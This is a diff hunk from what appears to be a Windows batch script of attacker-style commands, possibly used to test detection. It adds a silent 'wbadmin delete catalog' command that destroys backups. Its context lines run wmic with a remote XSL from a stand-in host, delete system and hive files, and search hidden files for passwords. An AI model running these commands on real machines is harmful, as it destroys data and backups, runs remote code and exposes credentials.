@@ -311,6 +311,8 @@ wmic.exe os get /format:"http://blah/foo.xsl"
 ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
+wbadmin delete catalog -quiet
+ECHO ============================
 ping -n 10 127.0.0.1
 ECHO ============================
 dir /s /b /A:H | findstr "pass"
